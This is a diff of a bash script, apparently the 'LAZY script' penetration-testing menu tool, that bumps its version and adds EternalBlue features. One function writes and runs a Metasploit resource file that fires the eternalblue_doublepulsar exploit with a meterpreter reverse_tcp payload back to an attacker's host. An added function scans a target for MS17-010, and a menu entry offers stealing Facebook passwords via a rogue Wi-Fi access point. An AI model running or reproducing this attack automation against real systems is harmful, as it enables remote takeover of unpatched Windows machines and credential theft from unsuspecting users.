@@ -1,9 +1,10 @@
 #! /bin/bash
-VERSION=1.9.4
+VERSION=1.9.5
 HOWMANYTOOLS=22
 BACKL="0"
 #############DEFAULTS###############
-
+function defaults_l
+{
 #setting yellow-start 
 	YS="\e[1;33m"
 #setting color-end
@@ -30,6 +31,7 @@ BACKL="0"
 	then
 		mkdir "$KSPATH"
 	fi
+}
 ##############FUNCTIONS#############
 function banner
 {
@@ -2247,6 +2249,7 @@ function hidden_shortcuts
 	echo -e ""$YS"  interface"$CE") Change your interface"
 	echo -e ""$YS"     wififb"$CE") Create open wifi access point and get fb passwords with wifiphisher"
 	echo -e ""$YS"eternalblue"$CE") Launch msfconsole with eternalblue exploit on target"
+	echo -e ""$YS"etercheck"$CE") Check if a target is vulnerable to eternalblue exploit"
 	echo -e ""$YS"  changelog"$CE") View the changelog of the lscript versions"
 	echo -e "$PAKTGB"
 	$READAK
@@ -2399,7 +2402,7 @@ function eternalblue
 	else
 		PAYLOADL="windows/meterpreter/reverse_tcp"
 	fi
-	echo -e "TARGET("$YS"1"$CE"-"$YS"8"$CE"): "
+	echo -e "TARGET("$YS"0"$CE"-"$YS"8"$CE"): "
 	read TARGETL
 	echo "use exploit/windows/smb/eternalblue_doublepulsar" > "$LPATH"/rce/eternalbluerc.rc
 	echo "set LHOST "$LHOSTL"" >> "$LPATH"/rce/eternalbluerc.rc
@@ -2410,6 +2413,20 @@ function eternalblue
 	echo "set PROCESSINJECT "$PROCESSINJECTL"" >> "$LPATH"/rce/eternalbluerc.rc
 	echo "show info" >> "$LPATH"/rce/eternalbluerc.rc
 	echo "exploit -j" >> "$LPATH"/rce/eternalbluerc.rc
+	msfconsole -r "$LPATH"/rce/eternalbluerc.rc
+	
+}
+function eternalblue_check
+{
+	if [ ! -d "$LPATH"/rce ]
+	then
+		mkdir	"$LPATH"/rce
+	fi
+	echo -e "RHOST: "
+	read RHOSTL
+	echo "use auxiliary/scanner/smb/smb_ms17_010" > "$LPATH"/rce/eternalbluerc.rc
+	echo "set RHOSTS "$RHOSTL"" >> "$LPATH"/rce/eternalbluerc.rc
+	echo "exploit" >> "$LPATH"/rce/eternalbluerc.rc
 	msfconsole -r "$LPATH"/rce/eternalbluerc.rc
 	
 }
@@ -2791,6 +2808,9 @@ function main_options
 	elif [ "$YORNAA" = "errors" ]
 	then
 		errors_menu
+	elif [ "$YORNAA" = "etercheck" ]
+	then
+		eternalblue_check
 	elif [ "$YORNAA" = "eternalblue" ]
 	then
 		eternalblue
@@ -2814,7 +2834,9 @@ var1=1
 check_if_ks
 ####
 }
+
 ####################################
+defaults_l
 printf '\033]2;The LAZY script\a'
 if [ "$ONETIMEPERLAUNCH" != "1" ]
 then
